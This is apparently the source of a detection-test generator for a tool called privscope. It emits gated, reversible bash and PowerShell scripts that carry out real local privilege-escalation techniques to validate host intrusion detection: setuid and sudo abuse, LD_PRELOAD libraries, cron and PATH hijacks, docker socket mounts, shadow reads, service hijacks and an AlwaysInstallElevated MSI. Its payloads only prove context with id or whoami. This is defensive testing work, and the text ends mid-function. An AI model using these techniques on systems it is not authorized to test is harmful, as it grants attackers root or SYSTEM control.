"""Turn analyzer findings into a gated, reversible detection-test script.

build_script(doc, report, platform) returns one self-contained script. The collector and
analyzer never import this; it runs offline on the operator's machine, and its output is
reviewed by a human before it ever touches a target. See RULES.md's sibling, REDTEAM.md,
for the contract.

Each finding whose rule has a technique below becomes one test function in the script.
Shared machinery (the authorization gate, logging, backup/restore, the id/whoami proof,
cleanup) lives in the header, so each test body stays short and readable.
"""
from __future__ import annotations

import shlex
from datetime import datetime, timezone
from typing import Callable, Dict, List, Optional

from .. import __version__

# ---------------------------------------------------------------------------------------
# A Technique maps one or more rule ids to a block of shell/PowerShell. extract() pulls the
# concrete paths it needs out of a finding (or returns None to skip), and body() renders the
# action, calling the header's helpers. Nothing here evades detection; every action is loud.
# ---------------------------------------------------------------------------------------


class Technique:
    def __init__(self, id, attack, name, rules, extract, body):
        self.id = id
        self.attack = attack
        self.name = name
        self.rules = set(rules)
        self.extract: Callable[[dict], Optional[dict]] = extract
        self.body: Callable[[dict], str] = body


def _ev(f, label, default=None):
    v = (f.get("evidence") or {}).get(label)
    return v if v not in (None, "") else default


def q(s) -> str:
    """POSIX-shell single-quote."""
    return shlex.quote(str(s))


def ps(s) -> str:
    """PowerShell single-quoted literal."""
    return "'" + str(s).replace("'", "''") + "'"


# ===== Linux techniques =================================================================

def _lin_suid_shell(f):
    p = _ev(f, "program") or f.get("subject")
    return {"bin": p} if p else None


def _b_suid_shell(p):
    b = q(p["bin"])
    return f"""  # setuid-root binary that can run a command: run id through it
  out=$(timeout 10 {b} . -maxdepth 0 -exec id \\; 2>/dev/null | grep -m1 uid=0 || true)
  pf_judge "$out\""""


def _lin_suid_writable(f):
    p = _ev(f, "program") or f.get("subject")
    return {"bin": p} if p else None


def _b_suid_writable(p):
    b = q(p["bin"])
    return f"""  # writable setuid-root binary: overwrite with a tiny setuid payload (needs a compiler)
  if ! pf_have cc && ! pf_have gcc; then pf_skip "no C compiler on this host"; return; fi
  pf_backup {b} || {{ pf_skip "could not back up the target"; return; }}
  src=$PF_WORK/p.c
  printf '%s\\n' '#include <unistd.h>' 'int main(){{setuid(0);setgid(0);execl("/bin/sh","sh","-c","id",0);}}' > "$src"
  ( cc "$src" -o {b} 2>/dev/null || gcc "$src" -o {b} 2>/dev/null ) || {{ pf_skip "compile failed"; return; }}
  out=$(timeout 10 {b} 2>/dev/null | grep -m1 uid=0 || true)
  pf_judge "$out\""""


def _lin_cap(f):
    p = _ev(f, "program") or f.get("subject")
    name = (p or "").rsplit("/", 1)[-1]
    interp = None
    if name.startswith("python"):
        interp = f"{p} -c 'import os;os.setuid(0);os.system(\"id\")'"
    elif name.startswith(("perl",)):
        interp = f"{p} -e 'POSIX::setuid(0);system(\"id\")' 2>/dev/null || {p} -e '$>=0;$<=0;system(\"id\")'"
    elif name.startswith(("ruby",)):
        interp = f"{p} -e 'Process::Sys.setuid(0);system(\"id\")'"
    if not interp:
        return {"bin": p, "interp": None}
    return {"bin": p, "interp": interp}


def _b_cap(p):
    if not p["interp"]:
        return (f"  # cap_setuid is present but {q(p['bin'])} is not an interpreter that exposes it\n"
                f"  pf_skip \"{p['bin'].rsplit('/',1)[-1]} does not use the capability\"")
    return f"""  # file capability lets this interpreter drop to uid 0
  out=$(timeout 10 sh -c {q(p['interp'])} 2>/dev/null | grep -m1 uid=0 || true)
  pf_judge "$out\""""


def _lin_sudo_all(f):
    return {"who": _ev(f, "who"), "cmd": _ev(f, "command")}


def _b_sudo_all(p):
    return """  # passwordless sudo to anything: run id as root
  out=$(timeout 10 sudo -n id 2>/dev/null | grep -m1 uid=0 || true)
  pf_judge "$out\""""


def _lin_sudo_shell(f):
    cmd = _ev(f, "command")
    path = _ev(f, "command") or ""
    return {"cmd": cmd, "bin": path.split()[0] if path else ""}


def _b_sudo_shell(p):
    b = q(p["bin"])
    return f"""  # passwordless sudo on a program that can run commands: use it to run id as root
  bn=$(basename {b})
  case $bn in
    find) out=$(timeout 10 sudo -n {b} . -maxdepth 0 -exec id \\; 2>/dev/null | grep -m1 uid=0 || true) ;;
    vim|vi|nano|less|more|man|awk|gawk) out=$(timeout 10 sudo -n {b} -c '!id' 2>/dev/null | grep -m1 uid=0 || true) ;;
    python*|perl*|ruby*|php*|node) out=$(timeout 10 sudo -n {b} -e 'system("id")' 2>/dev/null | grep -m1 uid=0 || timeout 10 sudo -n {b} -c 'import os;os.system("id")' 2>/dev/null | grep -m1 uid=0 || true) ;;
    sh|bash|dash|ash|ksh|zsh) out=$(timeout 10 sudo -n {b} -c id 2>/dev/null | grep -m1 uid=0 || true) ;;
    *) out=$(timeout 10 sudo -n {b} 2>/dev/null | grep -m1 uid=0 || true) ;;
  esac
  pf_judge "$out\""""


def _lin_sudo_ldpreload(f):
    return {"setting": _ev(f, "setting")}


def _b_sudo_ldpreload(p):
    return """  # sudo keeps LD_PRELOAD: load a library into a command we may run as root (needs a compiler)
  if ! pf_have cc && ! pf_have gcc; then pf_skip "no C compiler on this host"; return; fi
  cmd=$(sudo -n -l 2>/dev/null | awk '/NOPASSWD:|\\) / {sub(/.*NOPASSWD: */,"");sub(/.*\\) */,"");print;exit}')
  [ -n "$cmd" ] || { pf_skip "no runnable sudo command found"; return; }
  so=$PF_WORK/x.c; printf '%s\\n' '#include <stdlib.h>' '#include <unistd.h>' '__attribute__((constructor)) void i(){setuid(0);system("id");}' > "$so"
  ( cc "$so" -shared -fPIC -o "$PF_WORK/x.so" 2>/dev/null || gcc "$so" -shared -fPIC -o "$PF_WORK/x.so" 2>/dev/null ) || { pf_skip "compile failed"; return; }
  out=$(timeout 10 sudo -n LD_PRELOAD="$PF_WORK/x.so" $cmd 2>/dev/null | grep -m1 uid=0 || true)
  pf_judge "$out\""""


def _lin_cron(f):
    subj = f.get("subject", "")
    prog = subj.split(" -> ", 1)[1] if " -> " in subj else None
    return {"prog": prog, "src": _ev(f, "defined in")} if prog else None


def _b_cron(p):
    prog = q(p["prog"])
    return f"""  # root runs this on a schedule and it is writable: append a benign root-proof line
  pf_backup {prog} || {{ pf_skip "could not back up the script"; return; }}
  printf '\\n%s\\n' 'id > '"$PF_ROOT"'/cron.$PF_RUN 2>/dev/null' >> {prog}
  pf_note "modified a root-run scheduled script (the detectable event); waiting ${{PF_WAIT}}s for the trigger"
  out=$(pf_wait_marker "$PF_ROOT/cron.$PF_RUN")
  pf_judge "$out\""""


def _lin_ldpreload_file(f):
    return {"path": _ev(f, "file") or f.get("subject")}


def _b_ldpreload_file(p):
    path = q(p["path"])
    return f"""  # writable /etc/ld.so.preload: writing a library path here loads it into every binary
  pf_backup {path} 2>/dev/null || true
  echo "$PF_WORK/pre.so" >> {path}
  pf_note "wrote a library path into {p['path']} (the detectable event)"
  if pf_have cc || pf_have gcc; then
    printf '%s\\n' '#include <stdlib.h>' '__attribute__((constructor)) void i(){{if(!geteuid())system("id > '"$PF_ROOT"'/pre.$PF_RUN");}}' > "$PF_WORK/pre.c"
    ( cc "$PF_WORK/pre.c" -shared -fPIC -o "$PF_WORK/pre.so" 2>/dev/null || gcc "$PF_WORK/pre.c" -shared -fPIC -o "$PF_WORK/pre.so" 2>/dev/null ) && (sudo -n id >/dev/null 2>&1 || true)
    out=$(pf_wait_marker "$PF_ROOT/pre.$PF_RUN" 3)
    pf_judge "$out"
  else
    pf_record planted "wrote to ld.so.preload; no compiler to supply the library"
  fi"""


def _lin_docker(f):
    return {"sock": _ev(f, "socket") or f.get("subject")}


def _b_docker(p):
    return f"""  # writable container socket: a container that mounts the host root runs as root on the host
  if pf_have docker && docker -H "unix://{p['sock']}" info >/dev/null 2>&1; then
    out=$(timeout 60 docker -H "unix://{p['sock']}" run --rm -v /:/host alpine chroot /host id 2>/dev/null | grep -m1 uid=0 || true)
    pf_judge "$out"
  else
    pf_skip "docker client cannot use {p['sock']} from here"
  fi"""


def _lin_path(f):
    return {"dir": _ev(f, "folder"), "scope": _ev(f, "PATH of")}


def _b_path(p):
    d = q(p["dir"])
    return f"""  # writable directory in root's PATH: plant a command root may run by bare name
  mkdir -p {d} 2>/dev/null || true
  tgt={d}/privscope-$PF_RUN
  printf '%s\\n' '#!/bin/sh' 'id > '"$PF_ROOT"'/path.$PF_RUN 2>/dev/null' > "$tgt" && chmod +x "$tgt"
  pf_track_file "$tgt"
  pf_record planted "dropped an executable in a root PATH dir ({p['dir']}); root runs it if it calls this name"
  rm -f "$tgt" 2>/dev/null || true"""


def _lin_shadow(f):
    return {"path": _ev(f, "file") or f.get("subject")}


def _b_shadow(p):
    path = q(p["path"])
    return f"""  # readable password hashes: read the file (the detectable event); never store or crack it
  if [ -r {path} ]; then
    n=$(wc -c < {path} 2>/dev/null | tr -d ' ')
    r=$(grep -c '^root:[^*!:]' {path} 2>/dev/null); r=${{r:-0}}
    pf_record success "read {p['path']} ($n bytes, root hash present: $r); contents not stored"
  else
    pf_skip "not readable as this account"
  fi"""


LINUX: List[Technique] = [
    Technique("LIN-SUID-SHELL", "T1548.001", "Setuid-root shell-capable binary", {"PL-SUID-002"}, _lin_suid_shell, _b_suid_shell),
    Technique("LIN-SUID-WRITABLE", "T1548.001", "Overwrite a writable setuid-root binary", {"PL-SUID-001"}, _lin_suid_writable, _b_suid_writable),
    Technique("LIN-CAP-SETUID", "T1548.001", "Abuse a cap_setuid file capability", {"PL-CAP-001"}, _lin_cap, _b_cap),
    Technique("LIN-SUDO-ALL", "T1548.003", "Passwordless sudo to anything", {"PL-SUDO-001"}, _lin_sudo_all, _b_sudo_all),
    Technique("LIN-SUDO-SHELL", "T1548.003", "Passwordless sudo on a shell-capable program", {"PL-SUDO-002"}, _lin_sudo_shell, _b_sudo_shell),
    Technique("LIN-SUDO-LDPRELOAD", "T1548.003", "sudo env_keep LD_PRELOAD", {"PL-SUDO-005"}, _lin_sudo_ldpreload, _b_sudo_ldpreload),
    Technique("LIN-CRON-WRITABLE", "T1053.003", "Writable root cron program", {"PL-CRON-001"}, _lin_cron, _b_cron),
    Technique("LIN-LDPRELOAD-FILE", "T1574.006", "Writable /etc/ld.so.preload", {"PL-FILE-003"}, _lin_ldpreload_file, _b_ldpreload_file),
    Technique("LIN-DOCKER-SOCK", "T1611", "Writable container socket", {"PL-SOCK-001"}, _lin_docker, _b_docker),
    Technique("LIN-PATH-WRITABLE", "T1574.007", "Writable directory in root's PATH", {"PL-PATH-001"}, _lin_path, _b_path),
    Technique("LIN-SHADOW-READ", "T1003.008", "Readable password hashes", {"PL-FILE-002"}, _lin_shadow, _b_shadow),
]

# PL-FILE-003 covers several writable-config kinds; only fire the ld.so.preload test for that path.
def _only_ldpreload(f):
    path = _ev(f, "file") or f.get("subject") or ""
    return path.endswith("ld.so.preload")


# ===== Windows techniques (authored; not detonated during development) ==================

def _win_service_bin(f):
    return {"svc": _ev(f, "service"), "exe": _ev(f, "executable")}


def _b_win_service_bin(p):
    return f"""  # writable service binary: back it up, drop a SYSTEM-proof payload, restart, restore
  $exe = {ps(p['exe'])}; $svc = {ps(p['svc'])}
  if (-not (Pf-Backup $exe)) {{ Pf-Skip 'could not back up the binary'; return }}
  Pf-WritePayloadExe $exe
  Pf-Note "overwrote a service binary (the detectable event): $exe"
  Pf-TryStartService $svc
  Pf-JudgeMarker "svc.$script:PfRun\""""


def _win_unquoted(f):
    return {"svc": _ev(f, "service"), "cmd": _ev(f, "command")}


def _b_win_unquoted(p):
    return f"""  # unquoted service path: drop a payload at the first writable hijack point
  $cmd = {ps(p['cmd'])}
  $hit = Pf-UnquotedHijackPath $cmd
  if (-not $hit) {{ Pf-Skip 'no writable hijack point'; return }}
  Pf-WritePayloadExe $hit
  Pf-Note "planted $hit for unquoted path {ps(p['svc'])}"
  Pf-TryStartService {ps(p['svc'])}
  Pf-JudgeMarker "svc.$script:PfRun\""""


def _win_service_dll(f):
    return {"svc": _ev(f, "service"), "dir": _ev(f, "folder")}


def _b_win_service_dll(p):
    return f"""  # writable service folder: drop a DLL the service may load from its own directory
  $dir = {ps(p['dir'])}
  $dll = Join-Path $dir ("privscope-" + $script:PfRun + ".dll")
  Pf-WriteMarkerFile $dll 'benign placeholder DLL (not a real library)'
  Pf-TrackFile $dll
  Pf-Record planted "dropped a file in a writable service dir ($dir); a real test ships a proxy DLL"
  Remove-Item $dll -ErrorAction SilentlyContinue"""


def _win_task(f):
    return {"task": _ev(f, "task"), "exe": _ev(f, "program"), "path": _ev(f, "task folder")}


def _b_win_task(p):
    full = (str(_ev_default(p, 'path')) + str(p.get('task') or '')).replace("\\\\", "\\")
    return f"""  # writable program of a privileged task: back up, drop payload, run the task, restore
  $exe = {ps(p['exe'])}; $task = {ps(full)}
  if (-not (Pf-Backup $exe)) {{ Pf-Skip 'could not back up the program'; return }}
  Pf-WritePayloadExe $exe
  Pf-Note "overwrote a scheduled-task program (the detectable event): $exe"
  Pf-TryRunTask $task
  Pf-JudgeMarker "task.$script:PfRun\""""


def _win_autorun(f):
    return {"name": _ev(f, "entry"), "exe": _ev(f, "program")}


def _b_win_autorun(p):
    return f"""  # machine-wide Run program is writable: back up and drop a logon payload (fires next logon)
  $exe = {ps(p['exe'])}
  if (-not (Pf-Backup $exe)) {{ Pf-Skip 'could not back up the program'; return }}
  Pf-WritePayloadExe $exe
  Pf-Record planted "overwrote a machine-wide logon program ($exe); SYSTEM/next-user proof appears at logon"
  Pf-RestoreNow $exe"""


def _win_aie(f):
    return {}


def _b_win_aie(p):
    return """  # AlwaysInstallElevated: build a tiny MSI with a benign custom action, run it as SYSTEM
  $msi = Join-Path $env:TEMP ("privscope-" + $script:PfRun + ".msi")
  if (-not (Pf-BuildProofMsi $msi)) { Pf-Skip 'could not build the MSI (WindowsInstaller COM unavailable)'; return }
  Pf-TrackFile $msi
  Pf-Note "running an MSI under AlwaysInstallElevated (the detectable event)"
  Start-Process msiexec.exe -ArgumentList '/quiet','/qn','/i',$msi -Wait
  Pf-JudgeMarker "msi.$script:PfRun"
  Remove-Item $msi -ErrorAction SilentlyContinue"""


def _ev_default(p, k):
    return p.get(k) or ""


WINDOWS: List[Technique] = [
    Technique("WIN-SERVICE-BIN", "T1574.010", "Overwrite a writable service binary", {"PS-SVC-001"}, _win_service_bin, _b_win_service_bin),
    Technique("WIN-UNQUOTED", "T1574.009", "Unquoted service path hijack", {"PS-SVC-003"}, _win_unquoted, _b_win_unquoted),
    Technique("WIN-SERVICE-DLL", "T1574.001", "Writable service folder DLL plant", {"PS-SVC-002"}, _win_service_dll, _b_win_service_dll),
    Technique("WIN-TASK-BIN", "T1053.005", "Overwrite a privileged task's program", {"PS-TASK-001"}, _win_task, _b_win_task),
    Technique("WIN-AUTORUN", "T1547.001", "Overwrite a machine-wide logon program", {"PS-AUTO-001"}, _win_autorun, _b_win_autorun),
    Technique("WIN-AIE-MSI", "T1548.002", "AlwaysInstallElevated MSI", {"PS-POL-001"}, _win_aie, _b_win_aie),
]


# ===== selection ========================================================================

def _registry(platform):
    return LINUX if platform == "linux" else WINDOWS


def techniques_for(report: dict, platform: str) -> List[dict]:
    """[{technique, subject, params}] for each finding whose rule has a technique."""
    by_rule: Dict[str, Technique] = {}
    for t in _registry(platform):
        for r in t.rules:
            by_rule[r] = t
    out, seen = [], set()
    for f in report.get("findings", []):
        t = by_rule.get(f["rule"])
        if not t:
            continue
        if f["rule"] == "PL-FILE-003" and not _only_ldpreload(f):
            continue
        params = t.extract(f)
        if params is None:
            continue
        key = (t.id, f.get("subject"))
        if key in seen:
            continue
        seen.add(key)
        out.append({"technique": t, "subject": f.get("subject", ""), "params": params})
    return out


# ===== assembly =========================================================================

def build_script(doc: dict, report: dict, platform: str) -> str:
    sel = techniques_for(report, platform)
    host = (doc.get("host") or {}).get("hostname") or "unknown"
    stamp = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    meta = {"host": host, "stamp": stamp, "count": len(sel), "ver": __version__}
    return (_build_bash if platform == "linux" else _build_ps)(meta, sel)


def _build_bash(meta, sel) -> str:
    tests, dispatch, listing = [], [], []
    for i, s in enumerate(sel, 1):
        t = s["technique"]
        fn = f"t{i}"
        tests.append(
            f"{fn}() {{\n"
            f"  pf_begin {q(t.id)} {q(t.attack)} {q(s['subject'])} {q(t.name)}\n"
            f"{t.body(s['params'])}\n"
            f"}}"
        )
        dispatch.append(f'  {i}) {fn} ;;')
        listing.append(f'  printf "  %-3s %-20s %-11s %s\\n" {q(str(i))} {q(t.id)} {q(t.attack)} {q(s["subject"])}')
    return BASH_TEMPLATE.format(
        host=meta["host"], stamp=meta["stamp"], ver=meta["ver"], count=meta["count"],
        nums=" ".join(str(i) for i in range(1, len(sel) + 1)),
        tests="\n\n".join(tests) or "# (no applicable findings)",
        dispatch="\n".join(dispatch) or "  *) ;;",
        listing="\n".join(listing) or '  echo "  (none)"',
    )


def _build_ps(meta, sel) -> str:
    tests, dispatch, listing = [], [], []
    for i, s in enumerate(sel, 1):
        t = s["technique"]
        fn = f"Test-{i}"
        tests.append(
            f"function {fn} {{\n"
            f"  Pf-Begin {ps(t.id)} {ps(t.attack)} {ps(s['subject'])} {ps(t.name)}\n"
            f"{t.body(s['params'])}\n"
            f"}}"
        )
        dispatch.append(f'    {i} {{ {fn} }}')
        num = str(i).ljust(3)
        listing.append(f'  Write-Host ("  {num} " + {ps(t.id)}.PadRight(16) + " " + {ps(t.attack)}.PadRight(11) + " " + {ps(s["subject"])})')
    return PS_TEMPLATE.format(
        host=meta["host"], host_ps=ps(meta["host"]), stamp=meta["stamp"], ver=meta["ver"], count=meta["count"],
        nums=",".join(str(i) for i in range(1, len(sel) + 1)) or "0",
        tests="\n\n".join(tests) or "# (no applicable findings)",
        dispatch="\n".join(dispatch) or "    default { }",
        listing="\n".join(listing) or '  Write-Host "  (none)"',
    )


BASH_TEMPLATE = r"""#!/bin/bash
# privscope detection-test pack
#   host:       {host}   (run only where the collection was taken)
#   generated:  {stamp} by privscope {ver}
#   tests:      {count}
#
# AUTHORIZED TESTING ONLY. This script performs real local privilege-escalation techniques
# to generate telemetry for host-based IDS/IPS validation. It is dry-run by default. With
# --execute it detonates, but only if an authorization marker is present and the hostname
# matches. Each test backs up what it touches, proves the result with id, then restores and
# cleans up. No accounts, no persistence, no exfiltration, no evasion. Review before running.
#
# Usage:
#   ./pack.sh                 list the tests (dry run; changes nothing)
#   ./pack.sh --execute       run them, after the gate below passes
#   ./pack.sh --execute --only 3,5
#   ./pack.sh --execute --wait 90    seconds to wait for a scheduled trigger (default 60)
#
# Gate for --execute (all three):
#   1. a file at $PRIVSCOPE_AUTHORIZED (default /etc/privscope-authorized) exists;
#   2. this host's name matches the collection ({host}); override with --force-host;
#   3. you passed --execute.
set -u
PF_HOST={host}
PF_RUN=$(date +%Y%m%d-%H%M%S)-$$
PF_ROOT=${{PRIVSCOPE_TESTROOT:-/tmp/privscope-test}}
PF_LOG=$PF_ROOT/run-$PF_RUN.jsonl
PF_WORK=$(mktemp -d 2>/dev/null || echo /tmp/pf.$PF_RUN); mkdir -p "$PF_ROOT"
PF_WAIT=60
PF_AUTH=${{PRIVSCOPE_AUTHORIZED:-/etc/privscope-authorized}}
EXECUTE=0; ONLY=; FORCE_HOST=0
PF_BACKUPS=; PF_FILES=

while [ $# -gt 0 ]; do case $1 in
  --execute) EXECUTE=1 ;; --only) ONLY=$(echo "$2" | tr ',' ' '); shift ;;
  --wait) PF_WAIT=$2; shift ;; --force-host) FORCE_HOST=1 ;;
  --list|--dry-run) EXECUTE=0 ;; -h|--help) EXECUTE=0 ;;
  *) echo "unknown arg: $1" >&2; exit 2 ;;
esac; shift; done

pf_now() {{ date -u +%Y-%m-%dT%H:%M:%SZ; }}
pf_json() {{ printf '%s' "$1" | sed 's/\\/\\\\/g; s/"/\\"/g'; }}
pf_emit() {{ printf '{{"run":"%s","time":"%s","test":"%s","attack":"%s","subject":"%s","status":"%s","detail":"%s"}}\n' \
  "$PF_RUN" "$(pf_now)" "$(pf_json "$PF_ID")" "$(pf_json "$PF_ATTACK")" "$(pf_json "$PF_SUBJ")" "$1" "$(pf_json "$2")" >> "$PF_LOG"; }}
pf_begin() {{ PF_ID=$1; PF_ATTACK=$2; PF_SUBJ=$3; PF_NAME=$4; echo "[*] $PF_ID ($PF_ATTACK) $PF_SUBJ" >&2; pf_emit started ""; }}
pf_note()   {{ echo "    - $1" >&2; pf_emit telemetry "$1"; }}
pf_record() {{ echo "    = $1: $2" >&2; pf_emit "$1" "$2"; }}
pf_skip()   {{ pf_record skipped "$1"; }}
pf_have()   {{ command -v "$1" >/dev/null 2>&1; }}
pf_track_file() {{ PF_FILES="$PF_FILES $1"; }}
pf_backup() {{ [ -e "$1" ] || return 1; cp -p "$1" "$PF_WORK/bak.$(echo "$1" | tr '/ ' '__')" 2>/dev/null || return 1; PF_BACKUPS="$PF_BACKUPS $1"; return 0; }}
pf_wait_marker() {{ m=$1; w=${{2:-$PF_WAIT}}; i=0; while [ $i -lt "$w" ]; do [ -f "$m" ] && {{ cat "$m"; return; }}; sleep 1; i=$((i+1)); done; printf ''; }}
pf_judge() {{ if printf '%s' "$1" | grep -q 'uid=0'; then echo "privscope-proof $PF_RUN $PF_ID $1" > "$PF_ROOT/proof.$PF_ID.$PF_RUN"; pf_record success "reached root: $1"; else pf_record no_escalation "ran but no root context${{1:+: $1}}"; fi; }}

pf_cleanup() {{
  for p in $PF_BACKUPS; do b=$PF_WORK/bak.$(echo "$p" | tr '/ ' '__'); [ -f "$b" ] && cp -p "$b" "$p" 2>/dev/null; done
  for f in $PF_FILES; do rm -f "$f" 2>/dev/null; done
  rm -rf "$PF_WORK" 2>/dev/null
  echo "[*] restored backups and cleaned up; log: $PF_LOG" >&2
}}
trap pf_cleanup EXIT INT TERM

pf_list() {{
  echo "privscope detection-test pack for $PF_HOST  ({count} tests)"
  echo "  #   technique            att&ck      target"
{listing}
  echo
  echo "Dry run. Re-run with --execute to detonate (needs the authorization marker)."
}}

if [ "$EXECUTE" != 1 ]; then pf_list; exit 0; fi

# --- gate ---
if [ ! -e "$PF_AUTH" ]; then
  echo "REFUSED: authorization marker $PF_AUTH not found." >&2
  echo "Create it on hosts you are permitted to test, e.g.: sudo sh -c 'echo scope-note > $PF_AUTH'" >&2
  exit 3
fi
if [ "$FORCE_HOST" != 1 ] && [ "$(hostname 2>/dev/null)" != "$PF_HOST" ]; then
  echo "REFUSED: this host '$(hostname 2>/dev/null)' is not the collection host '$PF_HOST' (use --force-host to override)." >&2
  exit 3
fi
echo "=== privscope detection-test pack: EXECUTING on $(hostname) as $(id -un) at $(pf_now) ===" >&2
echo "=== authorized by $PF_AUTH : $(head -c 200 "$PF_AUTH" 2>/dev/null | tr '\n' ' ') ===" >&2
pf_emit() {{ printf '{{"run":"%s","time":"%s","test":"%s","attack":"%s","subject":"%s","status":"%s","detail":"%s"}}\n' \
  "$PF_RUN" "$(pf_now)" "$(pf_json "$PF_ID")" "$(pf_json "$PF_ATTACK")" "$(pf_json "$PF_SUBJ")" "$1" "$(pf_json "$2")" >> "$PF_LOG"; }}

{tests}

run_one() {{ case $1 in
{dispatch}
esac; }}

SEL="{nums}"; [ -n "$ONLY" ] && SEL="$ONLY"
for n in $SEL; do run_one "$n"; done
echo "[*] done. per-test results in $PF_LOG" >&2
"""


PS_TEMPLATE = r"""#requires -version 5
<#
  privscope detection-test pack
    host:       {host}   (run only where the collection was taken)
    generated:  {stamp} by privscope {ver}
    tests:      {count}

  AUTHORIZED TESTING ONLY. Performs real local privilege-escalation techniques to generate
  telemetry for host-based IDS/IPS validation. Dry-run by default; -Execute detonates only
  if the authorization marker exists and the hostname matches. Each test backs up what it
  touches, proves the result with whoami, then restores and cleans up. No accounts, no
  persistence, no exfiltration, no evasion. Review before running.

  Usage:
    .\pack.ps1                 list the tests (dry run)
    .\pack.ps1 -Execute        run them, after the gate passes
    .\pack.ps1 -Execute -Only 3,5
  Gate for -Execute: a file at $env:PRIVSCOPE_AUTHORIZED (default C:\privscope-authorized.txt)
  exists, AND this host matches the collection ({host}; override with -ForceHost).
#>
[CmdletBinding()]
param([switch]$Execute, [int[]]$Only, [switch]$ForceHost, [int]$WaitSeconds = 60)
$ErrorActionPreference = 'Continue'
$script:PfHost = {host_ps}
$script:PfRun  = (Get-Date -Format 'yyyyMMdd-HHmmss') + '-' + $PID
$script:PfRoot = if ($env:PRIVSCOPE_TESTROOT) {{ $env:PRIVSCOPE_TESTROOT }} else {{ 'C:\privscope-test' }}
$script:PfAuth = if ($env:PRIVSCOPE_AUTHORIZED) {{ $env:PRIVSCOPE_AUTHORIZED }} else {{ 'C:\privscope-authorized.txt' }}
$script:PfWork = Join-Path $env:TEMP ("pf-" + $script:PfRun)
$script:PfWait = $WaitSeconds
New-Item -ItemType Directory -Force $script:PfRoot, $script:PfWork | Out-Null
$script:PfLog = Join-Path $script:PfRoot ("run-" + $script:PfRun + ".jsonl")
$script:PfBackups = @{{}}; $script:PfFiles = @()
$script:PfId = ''; $script:PfAttack = ''; $script:PfSubj = ''

function Pf-Emit($status, $detail) {{
  ([pscustomobject]@{{ run=$script:PfRun; time=(Get-Date).ToUniversalTime().ToString('o'); test=$script:PfId; attack=$script:PfAttack; subject=$script:PfSubj; status=$status; detail="$detail" }} | ConvertTo-Json -Compress) | Add-Content -Encoding utf8 $script:PfLog
}}
function Pf-Begin($id, $attack, $subj, $name) {{ $script:PfId=$id; $script:PfAttack=$attack; $script:PfSubj=$subj; Write-Host "[*] $id ($attack) $subj"; Pf-Emit started '' }}
function Pf-Note($m)   {{ Write-Host "    - $m"; Pf-Emit telemetry $m }}
function Pf-Record($s, $m) {{ Write-Host "    = ${{s}}: $m"; Pf-Emit $s $m }}
function Pf-Skip($m)   {{ Pf-Record skipped $m }}
function Pf-TrackFile($p) {{ $script:PfFiles += $p }}
function Pf-Backup($p) {{ if (-not (Test-Path -LiteralPath $p)) {{ return $false }}; $b = Join-Path $script:PfWork ([IO.Path]::GetRandomFileName()); Copy-Item -LiteralPath $p $b -Force -ErrorAction SilentlyContinue; if ($?) {{ $script:PfBackups[$p]=$b; return $true }}; return $false }}
function Pf-RestoreNow($p) {{ if ($script:PfBackups.ContainsKey($p)) {{ Copy-Item $script:PfBackups[$p] $p -Force -ErrorAction SilentlyContinue }} }}
function Pf-WriteMarkerFile($p, $t) {{ Set-Content -LiteralPath $p -Value $t -Encoding ascii -ErrorAction SilentlyContinue }}
function Pf-WritePayloadExe($p) {{
  # benign proof payload: write whoami to a run marker. Batch is enough to prove execution context.
  $marker = Join-Path $script:PfRoot ("svc." + $script:PfRun)
  $cmd = "@echo off`r`nwhoami /user > `"$marker`" 2>&1`r`n"
  Set-Content -LiteralPath $p -Value $cmd -Encoding ascii -ErrorAction SilentlyContinue
}}
function Pf-JudgeMarker($name) {{
  $m = Join-Path $script:PfRoot $name
  $i = 0; while ($i -lt $script:PfWait -and -not (Test-Path $m)) {{ Start-Sleep 1; $i++ }}
  if (Test-Path $m) {{ $who = (Get-Content $m -Raw).Trim(); Copy-Item $m (Join-Path $script:PfRoot ("proof." + $script:PfId + "." + $script:PfRun)) -Force -EA SilentlyContinue; Pf-Record success "ran as: $who" }}
  else {{ Pf-Record no_escalation 'planted but the trigger did not fire within the wait window' }}
}}
function Pf-TryStartService($svc) {{ try {{ Restart-Service -Name $svc -Force -ErrorAction Stop }} catch {{ Pf-Note "could not restart $svc (fires when it next starts): $($_.Exception.Message)" }} }}
function Pf-TryRunTask($task) {{ try {{ Start-ScheduledTask -TaskPath (Split-Path $task) -TaskName (Split-Path $task -Leaf) -ErrorAction Stop }} catch {{ schtasks /run /tn $task 2>$null | Out-Null }} }}
function Pf-UnquotedHijackPath($cmd) {{
  $p = $cmd.Trim('"'); if ($p -notmatch '\s') {{ return $null }}
  $parts = $p -split '\s+'; $acc = ''
  foreach ($seg in $parts) {{ $acc = if ($acc) {{ "$acc $seg" }} else {{ $seg }}; $cand = "$acc.exe"; $dir = Split-Path $cand -ErrorAction SilentlyContinue
    if ($dir -and (Test-Path $dir) -and (Pf-Writable $dir)) {{ return $cand }} }}
  return $null
}}
function Pf-Writable($dir) {{ try {{ $t = Join-Path $dir ([IO.Path]::GetRandomFileName()); [IO.File]::WriteAllText($t,'x'); Remove-Item $t -Force; $true }} catch {{ $false }} }}
function Pf-BuildProofMsi($path) {{
  try {{
    $marker = Join-Path $script:PfRoot ("msi." + $script:PfRun)
    $installer = New-Object -ComObject WindowsInstaller.Installer
    $db = $installer.GetType().InvokeMember('OpenDatabase','InvokeMethod',$null,$installer,@($path,2))
    # minimal tables + a deferred-as-system custom action running whoami to the marker
    foreach ($sql in @(
      "CREATE TABLE Property (Property CHAR(72) NOT NULL, Value CHAR(255) PRIMARY KEY Property)",
      "INSERT INTO Property (Property, Value) VALUES ('ProductCode','{{00000000-0000-0000-0000-00000000C0DE}}')",
      "INSERT INTO Property (Property, Value) VALUES ('ProductName','privscope-test')",
      "INSERT INTO Property (Property, Value) VALUES ('ProductVersion','1.0.0')",
      "INSERT INTO Property (Property, Value) VALUES ('ManufacturerName','privscope')",
      "CREATE TABLE CustomAction (Action CHAR(72) NOT NULL, Type SHORT NOT NULL, Source CHAR(72), Target CHAR(255) PRIMARY KEY Action)",
      "INSERT INTO CustomAction (Action, Type, Source, Target) VALUES ('pf',3298,'cmd.exe','/c whoami /user > `"$marker`"')",
      "CREATE TABLE InstallExecuteSequence (Action CHAR(72) NOT NULL, Sequence SHORT PRIMARY KEY Action)",
      "INSERT INTO InstallExecuteSequence (Action, Sequence) VALUES ('pf',1)"
    )) {{ $v = $db.GetType().InvokeMember('OpenView','InvokeMethod',$null,$db,@($sql)); $v.GetType().InvokeMember('Execute','InvokeMethod',$null,$v,$null) }}
    $db.GetType().InvokeMember('Commit','InvokeMethod',$null,$db,$null)
    return (Test-Path $path)
